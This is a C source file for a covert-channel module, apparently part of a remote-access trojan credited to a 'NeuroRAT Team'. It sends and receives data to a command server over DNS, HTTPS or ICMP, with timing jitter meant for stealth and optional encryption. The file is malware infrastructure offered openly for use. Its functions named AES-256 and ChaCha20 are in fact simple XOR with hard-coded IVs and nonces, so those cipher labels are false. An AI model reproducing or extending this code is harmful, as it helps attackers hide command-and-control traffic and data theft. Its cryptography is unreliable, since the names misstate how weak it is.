/**
 * @file covert_channel.c
 * @brief Implementation of the covert channel module for hidden data transmission
 * @author iamtomasanderson@gmail.com (NeuroRAT Team)
 * @date 2023-09-01
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

#include "covert_channel.h"

// Forward declarations for channel-specific functions
extern void* dns_channel_init(const CovertChannelConfig* config);
extern int dns_channel_connect(void* handle);
extern int dns_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int dns_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern void dns_channel_cleanup(void* handle);

extern void* https_channel_init(const CovertChannelConfig* config);
extern int https_channel_connect(void* handle);
extern int https_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int https_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern void https_channel_cleanup(void* handle);

extern void* icmp_channel_init(const CovertChannelConfig* config);
extern int icmp_channel_connect(void* handle);
extern int icmp_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int icmp_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern void icmp_channel_cleanup(void* handle);

// Forward declarations for encryption functions
static int encrypt_data(const uint8_t* data, size_t data_len, uint8_t* encrypted_data, 
                        size_t* encrypted_len, EncryptionMethod method, 
                        const uint8_t* key, size_t key_len);
                        
static int decrypt_data(const uint8_t* encrypted_data, size_t encrypted_len, 
                        uint8_t* decrypted_data, size_t* decrypted_len, 
                        EncryptionMethod method, const uint8_t* key, size_t key_len);

// XOR encryption implementation
static int xor_encrypt(const uint8_t* data, size_t data_len, uint8_t* encrypted_data, 
                      size_t* encrypted_len, const uint8_t* key, size_t key_len);

// ChaCha20 encryption/decryption (simplified implementation)
static int chacha20_encrypt(const uint8_t* data, size_t data_len, 
                           uint8_t* encrypted_data, size_t* encrypted_len, 
                           const uint8_t* key, size_t key_len);
                           
static int chacha20_decrypt(const uint8_t* encrypted_data, size_t encrypted_len, 
                           uint8_t* decrypted_data, size_t* decrypted_len, 
                           const uint8_t* key, size_t key_len);

// AES-256 encryption/decryption (simplified implementation)
static int aes256_encrypt(const uint8_t* data, size_t data_len, 
                         uint8_t* encrypted_data, size_t* encrypted_len, 
                         const uint8_t* key, size_t key_len);
                         
static int aes256_decrypt(const uint8_t* encrypted_data, size_t encrypted_len, 
                         uint8_t* decrypted_data, size_t* decrypted_len, 
                         const uint8_t* key, size_t key_len);

// Structure to hold channel data
typedef struct {
    CovertChannelConfig config;
    void* channel_handle;
    
    // Jitter settings for randomizing transmission times
    unsigned int min_jitter_ms;
    unsigned int max_jitter_ms;
    
    // Last error message
    char last_error[256];
    
    // Function pointers for different channel operations
    void* (*channel_init)(const CovertChannelConfig*);
    int (*channel_connect)(void*);
    int (*channel_send)(void*, const uint8_t*, size_t);
    int (*channel_receive)(void*, uint8_t*, size_t, size_t*);
    void (*channel_cleanup)(void*);
} CovertChannelData;

// Helper function to sleep for a random amount of time within the jitter range
static void apply_jitter(unsigned int min_ms, unsigned int max_ms) {
    if (min_ms >= max_ms) {
        return;  // No jitter to apply
    }
    
    // Calculate random jitter value
    unsigned int jitter = min_ms + (rand() % (max_ms - min_ms + 1));
    
#ifdef _WIN32
    Sleep(jitter);
#else
    usleep(jitter * 1000);  // usleep takes microseconds
#endif
}

// Set last error message
static void set_last_error(CovertChannelData* channel_data, const char* format, ...) {
    if (!channel_data) {
        return;
    }
    
    va_list args;
    va_start(args, format);
    vsnprintf(channel_data->last_error, sizeof(channel_data->last_error), format, args);
    va_end(args);
}

void* covert_channel_init(const CovertChannelConfig* config) {
    if (!config) {
        return NULL;
    }
    
    // Allocate channel data
    CovertChannelData* channel_data = (CovertChannelData*)calloc(1, sizeof(CovertChannelData));
    if (!channel_data) {
        return NULL;
    }
    
    // Copy configuration
    memcpy(&channel_data->config, config, sizeof(CovertChannelConfig));
    
    // Initialize function pointers based on channel type
    switch (config->channel_type) {
        case CHANNEL_DNS:
            channel_data->channel_init = dns_channel_init;
            channel_data->channel_connect = dns_channel_connect;
            channel_data->channel_send = dns_channel_send;
            channel_data->channel_receive = dns_channel_receive;
            channel_data->channel_cleanup = dns_channel_cleanup;
            break;
            
        case CHANNEL_HTTPS:
            channel_data->channel_init = https_channel_init;
            channel_data->channel_connect = https_channel_connect;
            channel_data->channel_send = https_channel_send;
            channel_data->channel_receive = https_channel_receive;
            channel_data->channel_cleanup = https_channel_cleanup;
            break;
            
        case CHANNEL_ICMP:
            channel_data->channel_init = icmp_channel_init;
            channel_data->channel_connect = icmp_channel_connect;
            channel_data->channel_send = icmp_channel_send;
            channel_data->channel_receive = icmp_channel_receive;
            channel_data->channel_cleanup = icmp_channel_cleanup;
            break;
            
        default:
            set_last_error(channel_data, "Unsupported channel type: %d", config->channel_type);
            free(channel_data);
            return NULL;
    }
    
    // Initialize the specific channel
    channel_data->channel_handle = channel_data->channel_init(config);
    if (!channel_data->channel_handle) {
        set_last_error(channel_data, "Failed to initialize channel");
        free(channel_data);
        return NULL;
    }
    
    // Default jitter settings
    channel_data->min_jitter_ms = 0;
    channel_data->max_jitter_ms = 0;
    
    return channel_data;
}

int covert_channel_connect(void* handle) {
    if (!handle) {
        return -1;
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    
    // Apply jitter before connection for stealth
    apply_jitter(channel_data->min_jitter_ms, channel_data->max_jitter_ms);
    
    // Connect using channel-specific function
    int result = channel_data->channel_connect(channel_data->channel_handle);
    if (result != 0) {
        set_last_error(channel_data, "Failed to connect to C1 server");
    }
    
    return result;
}

int covert_channel_send(void* handle, const uint8_t* data, size_t data_len) {
    if (!handle || !data || data_len == 0) {
        return -1;
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    
    // Apply jitter before sending for stealth
    apply_jitter(channel_data->min_jitter_ms, channel_data->max_jitter_ms);
    
    // If encryption is enabled, encrypt the data before sending
    if (channel_data->config.encryption != ENCRYPTION_NONE) {
        uint8_t* encrypted_data = (uint8_t*)malloc(data_len + 100);  // Extra space for potential encryption overhead
        if (!encrypted_data) {
            set_last_error(channel_data, "Memory allocation failed for encryption");
            return -1;
        }
        
        size_t encrypted_len = 0;
        int encrypt_result = encrypt_data(
            data, data_len, 
            encrypted_data, &encrypted_len, 
            channel_data->config.encryption, 
            channel_data->config.encryption_key, 
            channel_data->config.encryption_key_len
        );
        
        if (encrypt_result != 0) {
            set_last_error(channel_data, "Encryption failed");
            free(encrypted_data);
            return -1;
        }
        
        // Send encrypted data
        int send_result = channel_data->channel_send(
            channel_data->channel_handle, 
            encrypted_data, 
            encrypted_len
        );
        
        free(encrypted_data);
        
        if (send_result != 0) {
            set_last_error(channel_data, "Failed to send data");
            return -1;
        }
    } else {
        // Send unencrypted data
        int send_result = channel_data->channel_send(
            channel_data->channel_handle, 
            data, 
            data_len
        );
        
        if (send_result != 0) {
            set_last_error(channel_data, "Failed to send data");
            return -1;
        }
    }
    
    return 0;
}

int covert_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received) {
    if (!handle || !buffer || buffer_size == 0 || !bytes_received) {
        return -1;
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    *bytes_received = 0;
    
    // Apply jitter before receiving for stealth
    apply_jitter(channel_data->min_jitter_ms, channel_data->max_jitter_ms);
    
    // If encryption is enabled, we need a temporary buffer for the encrypted data
    if (channel_data->config.encryption != ENCRYPTION_NONE) {
        uint8_t* encrypted_buffer = (uint8_t*)malloc(buffer_size);
        if (!encrypted_buffer) {
            set_last_error(channel_data, "Memory allocation failed for decryption");
            return -1;
        }
        
        size_t encrypted_bytes = 0;
        int receive_result = channel_data->channel_receive(
            channel_data->channel_handle, 
            encrypted_buffer, 
            buffer_size, 
            &encrypted_bytes
        );
        
        if (receive_result != 0) {
            set_last_error(channel_data, "Failed to receive data");
            free(encrypted_buffer);
            return -1;
        }
        
        // If we received data, decrypt it
        if (encrypted_bytes > 0) {
            int decrypt_result = decrypt_data(
                encrypted_buffer, encrypted_bytes,
                buffer, bytes_received,
                channel_data->config.encryption,
                channel_data->config.encryption_key,
                channel_data->config.encryption_key_len
            );
            
            free(encrypted_buffer);
            
            if (decrypt_result != 0) {
                set_last_error(channel_data, "Decryption failed");
                return -1;
            }
        } else {
            free(encrypted_buffer);
        }
    } else {
        // Receive unencrypted data
        int receive_result = channel_data->channel_receive(
            channel_data->channel_handle,
            buffer,
            buffer_size,
            bytes_received
        );
        
        if (receive_result != 0) {
            set_last_error(channel_data, "Failed to receive data");
            return -1;
        }
    }
    
    return 0;
}

int covert_channel_set_jitter(void* handle, unsigned int min_jitter_ms, unsigned int max_jitter_ms) {
    if (!handle) {
        return -1;
    }
    
    if (min_jitter_ms > max_jitter_ms) {
        return -1;
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    channel_data->min_jitter_ms = min_jitter_ms;
    channel_data->max_jitter_ms = max_jitter_ms;
    
    return 0;
}

int covert_channel_is_connected(void* handle) {
    // This is a simplified implementation.
    // In a real implementation, you would check the actual connection status.
    return (handle != NULL) ? 1 : 0;
}

void covert_channel_cleanup(void* handle) {
    if (!handle) {
        return;
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    
    // Clean up the specific channel
    if (channel_data->channel_handle && channel_data->channel_cleanup) {
        channel_data->channel_cleanup(channel_data->channel_handle);
    }
    
    // Free memory
    free(channel_data);
}

const char* covert_channel_get_error(void* handle) {
    if (!handle) {
        return "Invalid handle";
    }
    
    CovertChannelData* channel_data = (CovertChannelData*)handle;
    return channel_data->last_error;
}

// XOR encryption implementation (simple and reversible)
static int xor_encrypt(const uint8_t* data, size_t data_len, uint8_t* encrypted_data, 
                      size_t* encrypted_len, const uint8_t* key, size_t key_len) {
    if (!data || !encrypted_data || !encrypted_len || !key || key_len == 0) {
        return -1;
    }
    
    *encrypted_len = data_len;
    
    for (size_t i = 0; i < data_len; i++) {
        encrypted_data[i] = data[i] ^ key[i % key_len];
    }
    
    return 0;
}

// ChaCha20 encryption (simplified implementation for demonstration)
static int chacha20_encrypt(const uint8_t* data, size_t data_len, 
                           uint8_t* encrypted_data, size_t* encrypted_len, 
                           const uint8_t* key, size_t key_len) {
    // In a real implementation, this would use the actual ChaCha20 algorithm
    // For simplicity, this example uses XOR encryption with some additional steps
    
    if (!data || !encrypted_data || !encrypted_len || !key || key_len == 0) {
        return -1;
    }
    
    // For demonstration purposes, we're just using XOR with the key repeated
    *encrypted_len = data_len;
    
    // "Nonce" - would be random in real implementation
    uint8_t nonce[8] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
    
    for (size_t i = 0; i < data_len; i++) {
        uint8_t keystream = key[i % key_len] ^ nonce[i % 8];
        encrypted_data[i] = data[i] ^ keystream;
    }
    
    return 0;
}

static int chacha20_decrypt(const uint8_t* encrypted_data, size_t encrypted_len, 
                           uint8_t* decrypted_data, size_t* decrypted_len, 
                           const uint8_t* key, size_t key_len) {
    // ChaCha20 is symmetric, so decryption is the same as encryption
    return chacha20_encrypt(encrypted_data, encrypted_len, decrypted_data, decrypted_len, key, key_len);
}

// AES-256 encryption (simplified implementation for demonstration)
static int aes256_encrypt(const uint8_t* data, size_t data_len, 
                         uint8_t* encrypted_data, size_t* encrypted_len, 
                         const uint8_t* key, size_t key_len) {
    // In a real implementation, this would use the actual AES-256 algorithm
    // For simplicity, this example uses XOR encryption with some additional steps
    
    if (!data || !encrypted_data || !encrypted_len || !key || key_len < 32) {
        return -1;
    }
    
    // For demonstration purposes, we're implementing a very basic substitution
    *encrypted_len = data_len;
    
    // "IV" - would be random in real implementation
    uint8_t iv[16] = {0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 
                     0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x00};
    
    for (size_t i = 0; i < data_len; i++) {
        uint8_t keystream = key[i % key_len] ^ iv[i % 16] ^ (i & 0xFF);
        encrypted_data[i] = data[i] ^ keystream;
    }
    
    return 0;
}

static int aes256_decrypt(const uint8_t* encrypted_data, size_t encrypted_len, 
                         uint8_t* decrypted_data, size_t* decrypted_len, 
                         const uint8_t* key, size_t key_len) {
    // For our simplified implementation, decryption is the same as encryption
    return aes256_encrypt(encrypted_data, encrypted_len, decrypted_data, decrypted_len, key, key_len);
}

// Encryption dispatch function
static int encrypt_data(const uint8_t* data, size_t data_len, uint8_t* encrypted_data, 
                        size_t* encrypted_len, EncryptionMethod method, 
                        const uint8_t* key, size_t key_len) {
    if (!data || data_len == 0 || !encrypted_data || !encrypted_len || !key || key_len == 0) {
        return -1;
    }
    
    switch (method) {
        case ENCRYPTION_NONE:
            // Just copy the data
            memcpy(encrypted_data, data, data_len);
            *encrypted_len = data_len;
            return 0;
            
        case ENCRYPTION_XOR:
            return xor_encrypt(data, data_len, encrypted_data, encrypted_len, key, key_len);
            
        case ENCRYPTION_AES256:
            return aes256_encrypt(data, data_len, encrypted_data, encrypted_len, key, key_len);
            
        case ENCRYPTION_CHACHA20:
            return chacha20_encrypt(data, data_len, encrypted_data, encrypted_len, key, key_len);
            
        default:
            return -1;
    }
}

// Decryption dispatch function
static int decrypt_data(const uint8_t* encrypted_data, size_t encrypted_len, 
                        uint8_t* decrypted_data, size_t* decrypted_len, 
                        EncryptionMethod method, const uint8_t* key, size_t key_len) {
    if (!encrypted_data || encrypted_len == 0 || !decrypted_data || !decrypted_len || !key || key_len == 0) {
        return -1;
    }
    
    switch (method) {
        case ENCRYPTION_NONE:
            // Just copy the data
            memcpy(decrypted_data, encrypted_data, encrypted_len);
            *decrypted_len = encrypted_len;
            return 0;
            
        case ENCRYPTION_XOR:
            return xor_encrypt(encrypted_data, encrypted_len, decrypted_data, decrypted_len, key, key_len);
            
        case ENCRYPTION_AES256:
            return aes256_decrypt(encrypted_data, encrypted_len, decrypted_data, decrypted_len, key, key_len);
            
        case ENCRYPTION_CHACHA20:
            return chacha20_decrypt(encrypted_data, encrypted_len, decrypted_data, decrypted_len, key, key_len);
            
        default:
            return -1;
    }
} 